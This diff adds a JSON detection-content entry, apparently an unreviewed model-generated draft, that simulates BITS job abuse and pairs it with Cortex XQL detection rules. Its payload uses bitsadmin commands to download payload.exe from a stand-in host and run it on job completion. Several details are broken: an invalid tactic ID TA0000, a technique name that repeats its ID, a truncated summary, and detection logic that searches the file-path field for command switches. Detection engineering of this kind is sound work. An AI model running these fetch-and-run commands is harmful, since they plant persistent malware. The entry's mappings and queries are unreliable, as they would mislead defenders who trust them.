@@ -1,0 +1,145 @@
+{
+  "id": "TTP-0000-0012",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "BITS Job Abuse via bitsadmin for Persistent Payload Delivery",
+    "summary": "An attacker uses bitsadmin to create a persistent BITS job that downloads and executes a payload on completion, surviving reboots. Cortex should detect the bitsadmin command line and the BITS service ",
+    "description": "An attacker uses bitsadmin to create a persistent BITS job that downloads and executes a payload on completion, surviving reboots. Cortex should detect the bitsadmin command line and the BITS service fetching from a remote host."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1197",
+        "name": "T1197",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "bitsadmin.exe /create MyJob\nbitsadmin.exe /addfile MyJob http://192.0.2.5/payload.exe C:\\temp\\payload.exe\nbitsadmin.exe /SetNotifyCmdLine MyJob C:\\temp\\payload.exe null\nbitsadmin.exe /resume MyJob\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "bitsadmin.exe process creation with specific command line arguments",
+        "expected_value": "action_process_image_name = 'bitsadmin.exe' and action_file_path contains 'MyJob'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "BITS service connecting to remote C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.5' and dst_port = 80"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "BITS Job Creation",
+        "description": "Detection of bitsadmin.exe creating a job with notify command line",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'bitsadmin.exe'\n| filter action_file_path contains '/create'\n| filter action_file_path contains '/SetNotifyCmdLine'",
+        "mitre_technique_ids": [
+          "T1197"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "BITS Job Creation Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'bitsadmin.exe'\n| filter action_file_path contains '/create'\n| filter action_file_path contains '/SetNotifyCmdLine'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1197",
+      "url": "https://attack.mitre.org/techniques/T1197/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1105",
+      "url": "https://attack.mitre.org/techniques/T1105/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
